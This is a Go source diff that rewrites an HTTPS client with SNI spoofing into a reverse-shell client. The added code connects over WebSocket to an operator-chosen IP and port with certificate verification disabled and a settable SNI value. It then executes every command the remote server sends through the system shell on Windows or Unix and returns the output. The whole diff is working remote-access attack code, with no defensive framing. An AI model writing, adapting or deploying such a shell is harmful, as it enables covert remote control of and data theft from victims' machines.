@@ -5,67 +5,150 @@ import (
 	"fmt"
 	"io"
 	"log"
-	"net"
-	"net/http"
 	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+
+	"github.com/gorilla/websocket"
 )
 
 func main() {
-	var targetHost string
+	var targetIP string
+	var targetPort string
 	var sniValue string
 
-	if len(os.Args) != 3 {
-		fmt.Println("Usage: ./client <target_host> <sni_value>")
+	if len(os.Args) != 4 {
+		fmt.Println("Usage: ./client <target_ip> <target_port> <sni_value>")
 		os.Exit(1)
 	}
 
-	targetHost = os.Args[1]
-	sniValue = os.Args[2]
+	targetIP = os.Args[1]
+	targetPort = os.Args[2]
+	sniValue = os.Args[3]
 
 	tlsConfig := &tls.Config{
 		InsecureSkipVerify: true,
 		ServerName:         sniValue,
 	}
 
-	// Create a custom dialer
-	dialer := &tls.Dialer{
-		Config: tlsConfig,
+	dialer := websocket.Dialer{
+		TLSClientConfig: tlsConfig,
 	}
 
-	// Create a custom transport with our dialer
-	transport := &http.Transport{
-		DialTLS: func(network, addr string) (net.Conn, error) {
-			conn, err := dialer.Dial(network, addr)
-			if err != nil {
-				return nil, err
-			}
-			// Type assert to *tls.Conn to access ConnectionState
-			tlsConn := conn.(*tls.Conn)
-			// Handshake is required to populate ConnectionState
-			if err := tlsConn.Handshake(); err != nil {
-				conn.Close()
-				return nil, err
-			}
-			fmt.Printf("Sending request...\n\tHost: %s\n\tSNI:  %s\n", targetHost, tlsConn.ConnectionState().ServerName)
-			return conn, nil
-		},
-	}
-
-	// Create a client with our custom transport
-	client := &http.Client{Transport: transport}
-
-	// Make the HTTPS request
-	resp, err := client.Get(targetHost)
+	url := fmt.Sprintf("wss://%s:%s/ws", targetIP, targetPort)
+	conn, _, err := dialer.Dial(url, nil)
 	if err != nil {
-		log.Fatal("Error making request:", err)
+		log.Fatal("Error connecting to WebSocket server:", err)
 	}
-	defer resp.Body.Close()
+	defer conn.Close()
 
-	// Read and print the response body
-	body, err := io.ReadAll(resp.Body)
+	// Get initial working directory and hostname for prompt
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME") // for Windows
+	}
+
+	for {
+		// Get current working directory for prompt
+		cwd, _ := os.Getwd()
+
+		// Send initial prompt to server
+		prompt := fmt.Sprintf("\n%s@%s:%s $ ", username, hostname, cwd)
+		err := conn.WriteMessage(websocket.TextMessage, []byte(prompt))
+		if err != nil {
+			log.Println("Error sending prompt:", err)
+			break
+		}
+
+		// Read command from server
+		_, message, err := conn.ReadMessage()
+		if err != nil {
+			log.Println("Error reading command:", err)
+			break
+		}
+
+		command := string(message)
+		if command == "" {
+			continue
+		}
+
+		// Execute with full pipe handling
+		output, err := executeCommand(command, cwd)
+		if err != nil {
+			output = []byte(fmt.Sprintf("Error executing command: %s\n%s", err, output))
+		}
+
+		// Send output back to server
+		if len(output) == 0 {
+			output = []byte("\n")
+		}
+		err = conn.WriteMessage(websocket.TextMessage, output)
+		if err != nil {
+			log.Println("Error sending output:", err)
+			break
+		}
+	}
+}
+
+func executeCommand(command string, cwd string) ([]byte, error) {
+	// Prepare command execution based on shell type
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", command)
+	} else {
+		cmd = exec.Command("/bin/sh", "-c", command)
+	}
+
+	// Set the working directory for the command
+	cmd.Dir = cwd
+
+	// Handle cd command separately
+	if strings.HasPrefix(command, "cd ") {
+		dir := strings.TrimPrefix(command, "cd ")
+		err := os.Chdir(dir)
+		if err != nil {
+			return []byte(err.Error()), err
+		}
+		// Get and return new working directory
+		pwd, err := os.Getwd()
+		if err != nil {
+			return []byte(err.Error()), err
+		}
+		return []byte("Changed directory to: " + pwd + "\n"), nil
+	}
+
+	// Create pipes for both stdout and stderr
+	stdout, err := cmd.StdoutPipe()
 	if err != nil {
-		log.Fatal("Error reading response:", err)
+		return nil, err
+	}
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		return nil, err
 	}
 
-	fmt.Printf("Response: [%s]\n", body)
+	// Start the command
+	if err := cmd.Start(); err != nil {
+		return nil, err
+	}
+
+	// Read both outputs
+	stdoutBytes, err := io.ReadAll(stdout)
+	if err != nil {
+		return nil, err
+	}
+	stderrBytes, err := io.ReadAll(stderr)
+	if err != nil {
+		return nil, err
+	}
+
+	// Wait for command to complete
+	if err := cmd.Wait(); err != nil {
+		return append(stdoutBytes, stderrBytes...), err
+	}
+
+	// Combine stdout and stderr
+	return append(stdoutBytes, stderrBytes...), nil
 }
